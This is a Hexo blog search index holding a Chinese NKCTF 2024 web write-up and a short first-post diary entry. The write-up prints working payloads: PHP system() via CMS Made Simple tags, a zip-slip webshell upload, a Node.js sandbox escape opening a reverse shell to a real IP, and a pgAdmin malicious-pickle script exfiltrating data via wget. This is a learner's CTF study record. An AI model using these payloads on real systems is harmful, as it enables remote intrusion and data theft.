<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NKCTF_WP</title>
      <link href="/2024/03/25/NKCTF-WP/"/>
      <url>/2024/03/25/NKCTF-WP/</url>
      
        <content type="html"><![CDATA[<p>其实这次比赛真正思考的时间不多，和学会的内部赛冲突了，少了8个小时，打完内部赛之后就跟着学长们的思路复现了。这两天给大脑输入了太多东西，学长们的思路也没来的及消化，就借这篇半引用的WP帮自己梳理一下，也存档一下</p><h1>WEB</h1><h1>my_first_cms</h1><p>题目是的框架用的是cms-made-simple</p><blockquote><p>后台密码</p><p>admin/Admin123</p><p>1 ) log in as admin and go to Extensions &gt; User Defined Tags &gt;</p><p>2 ) Write in Code place payload &gt; <code>&lt;?php echo system('id'); ?&gt;</code></p><p>3 ) After click run you will be see result :</p><p>uid=1000(admin) gid=1000(admin) groups=1000(admin) uid=1000(admin) gid=1000(admin) groups=1000(admin)</p></blockquote><p>漏洞文章<a href="https://hub.packtpub.com/cms-made-simple-application-user-defined-tags/">https://hub.packtpub.com/cms-made-simple-application-user-defined-tags/</a><br>省流版<a href="https://packetstormsecurity.com/files/177241/CMS-Made-Simple-2.2.19-Remote-Code-Execution.html">https://packetstormsecurity.com/files/177241/CMS-Made-Simple-2.2.19-Remote-Code-Execution.html</a></p><h3 id="工作原理">工作原理</h3><p>用户自定义标签通过将PHP代码与Smarty模板引擎识别的标签关联起来。当Smarty解析模板遇到该标签时，它会执行相关的PHP代码，并将标签标记替换为PHP代码的输出</p><p>一开始我自己找到的文章不对，是这个框架的另一个SSTI洞，后来5x给出了正确的漏洞文章，按步骤找到对应页面粘贴上payload，换成 <code>ls /</code>然后<code>cat flag</code>皆可</p><p><img src="/pic/flag1.png" alt="flag1"></p><p>吐槽一下自己猜弱口令经验太少，一开始admin123都试了居然没试Admin123</p><h1>用过就是熟悉</h1><blockquote><p>用户账号密码在数据库文件中</p><p>admin/!@!@!@!@NKCTFNKCTFChu0</p><p>guest/!@!@!@!@NKCTFChu0</p><p>在本地搞个压缩包，里面放webshell</p><p>登录后台，将压缩包上传</p><p><img src="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=YTYzZTNlNjc2NmFlMGU4N2M3ZTEyNTJmZjdjNmFiYjFfVEpETWd3RVdpenAxVUdlR3dpNjE0OHlBOEVuS2VpYllfVG9rZW46U1p4QWJHYVdXb05MRTl4eFdEZWNJNU5JbkdjXzE3MTEyOTM5OTM6MTcxMTI5NzU5M19WNA" alt=""></p><p>修改数据包中的pathto为%7D%2F%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f</p><p>之后就能跨目录解压到</p><p><a href="http://8629d181-00ee-4ebd-8caa-c23531b6d2a1.node.nkctf.yuzhian.com.cn/">http://8629d181-00ee-4ebd-8caa-c23531b6d2a1.node.nkctf.yuzhian.com.cn/</a>}/shell.php</p><p><img src="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=NTk5YzkwOGYzM2Q2YjQ2ZjdiZGYyMGRkOGQ2Y2MyZmVfa29Sem5jeUNJRENPVGl5aUdwazVHeEdpWm4yejdNNzdfVG9rZW46WWZyYWIxWG1Cb2g1WUh4alVxc2NzMXA4bkdFXzE3MTEyOTM5OTM6MTcxMTI5NzU5M19WNA" alt=""></p></blockquote><p>这题主要利用的漏洞是压缩包slip</p><p>Zip Slip是一个广泛存在的漏洞，除了Java语言，JavaScript，Ruby，.NET和Go都有此问题。</p><p>利用此漏洞有两个前提：</p><ul><li>有恶意的压缩文件（这一点我们可以自己构造）</li><li>提取代码不会执行目录检查。</li></ul><p>恶意的压缩文件一般包含<code>../</code>目录，从而解压时会跳出当前目录。</p><p>提取代码一般会得到压缩文件中的文件目录，如果不对这些目录进行校验则会出现slip问题</p><pre><code>学长说这种漏洞在实际场景中还是很常见的，很多cms还有这种洞参考文献：</code></pre><p>​</p><p><img src="/pic/ck.png" alt="ck"></p><p>这题要重视</p><h1>最简单的CTF</h1><p>题目有一个js代码的提交窗口，可以填入任意代码submit，源码有waf</p><blockquote><h1>反弹shell,大小写绕过,getOwnPropertyDescriptor获取所有属性值</h1></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> code = <span class="string">`throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">    get: function() &#123;</span></span><br><span class="line"><span class="string">        const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">        const p = (cc.constructor.constructor(&#x27;return PROCESS&#x27;.toLowerCase()))();</span></span><br><span class="line"><span class="string">        return Object.getOwnPropertyDescriptor(p.mainModule.require(&#x27;child_Process&#x27;.toLowerCase()), &#x27;EXEC&#x27;.toLowerCase()).value(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.115.225.25/2333 0&gt;&amp;1&quot;&#x27;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;)</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure><p>sorry这题还没机会看太多源码，不是太清楚为什么要打这段payload<br>收获最多的是逼着我当晚上腾讯云搞了个服务器，终于可以在公网接收反弹shell了</p><p><img src="/pic/shell2.png" alt="shell2"></p><p><img src="/pic/shell1.png" alt="shell1"></p><h1>attack_tacooooo</h1><p><a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/</a><br><img src="%5Cpic%5C7.png" alt="[7.png]"><br><img src="%5Cpic%5C8.png" alt="[8.png]"><br>没什么好说的，真的就是按着文章打，经复现测试少一步都不行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def produce_pickle_bytes(platform, cmd):</span><br><span class="line">    b = b<span class="string">&#x27;\x80\x04\x95&#x27;</span></span><br><span class="line">    b += struct.pack(<span class="string">&#x27;L&#x27;</span>, 22 + len(platform) + len(cmd))</span><br><span class="line">    b += b<span class="string">&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, len(platform)) + platform.encode()</span><br><span class="line">    b += b<span class="string">&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span></span><br><span class="line">    b += b<span class="string">&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, len(cmd)) + cmd.encode()</span><br><span class="line">    b += b<span class="string">&#x27;\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="built_in">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != 2:</span><br><span class="line">        <span class="built_in">exit</span>(f<span class="string">&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;</span>)</span><br><span class="line">    HOST = <span class="string">&#x27;1.1.1.1:8000&#x27;</span></span><br><span class="line">    with open(<span class="string">&#x27;posix.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(<span class="string">&#x27;posix&#x27;</span>, f<span class="string">&quot;wget http://121.40.98.237:7777 --post-data=`ls /usr/bin|base64|tr -d &#x27;\n&#x27;`&quot;</span>))</span><br></pre></td></tr></table></figure><p>运行上面的<code>pickler.py</code></p><p>得到posix.pickle文件后</p><p>登录web服务器，账号密码分别为<code>tacooooo@qq.com</code>/tacooooo`</p><p>点</p><p><img src="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=NzI5OGYyM2Y5ZmI1NzQ5OWI2OTc5MzE0MTlmYjM0YjNfaHkwWTdHbmxWS0JrNlltS2pNVlhwQTNBWENJbmRCdWJfVG9rZW46TlVFYWJYWHN4bzV3RVN4Z0xtMGN0YWRIbnc1XzE3MTEyOTU1MTM6MTcxMTI5OTExM19WNA" alt=""></p><p>将生成的posix.pickle文件上传</p><p><img src="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=MmExMWViZjkyNzQ5OWEwN2Q0NjU2MTFjMzMzYWQ0ZmZfSzAwbDROWE5Iamx0WDljS0s5NHE4THE0cHJsc3dENmRfVG9rZW46Q2ROT2JWaWFMb0lVaHB4ZlpyWmNQTVVWbmFiXzE3MTEyOTU1MTM6MTcxMTI5OTExM19WNA" alt=""></p><p>然后发送下面的数据包,就能执行命令了，看服务器对应的回显就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /browser/ HTTP/1.1</span><br><span class="line">Host: ee86fb88-5fd5-4f9c-9f6d-68b490e101d8.node.nkctf.yuzhian.com.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://9dbb3625-3439-4b7c-bea5-29ec33888059.node.nkctf.yuzhian.com.cn/login</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: pga4_session=../storage/tacooooo_qq.com/posix.pickle!a; PGADMIN_LANGUAGE=zh</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上周的TLS招新赛也出现了pickle反序列化，一直没找到时间真正学习，要把这个提上日程了</p>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>first blog</title>
      <link href="/2024/03/21/hello-world/"/>
      <url>/2024/03/21/hello-world/</url>
      
        <content type="html"><![CDATA[<h1>第一篇博客</h1><p>稍微记录一下，最开始本来没有搭建个人博客的想法的，以前不太清楚个人博客的定位是什么，因为如果不是大牛的话好像也没什么人看。但是上周几场比赛把自己打自闭了之后还是深刻地认识到了自己与大佬之间的差距，又燃起了许多学习的欲望。上学期的学习进度总是不太持续，一段时间猛猛学又一段毫无斗志，这次也是希望借由博客来帮助自己持续:<em>输入–&gt;输出</em> 这个过程吧，后面就把一些学习笔记记录上来，或许也会继续更一些生活学习的碎碎念哈哈哈</p><p>Anyway搭博客的过程虽然有点折腾，但是比起配CTF各种奇奇怪怪的脚本，工具的环境来说还是很简易了哈哈，基于githubpage的搭建也让我一个脚本纯靠CV大法的人学到一些github仓库的上传，管理操作.</p><p>过段时间比较有空了再慢慢捣鼓完善下网站的功能，这周的时间真的被榨干了，一堆作业和周末的比赛和web分享会</p><p>感谢搭建过程给予帮助的学长！</p><p>3500：<a href="https://huanxin-chen.github.io/">3500</a></p><p>顺虞：<a href="https://liu1272.github.io/about/">Robin</a></p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
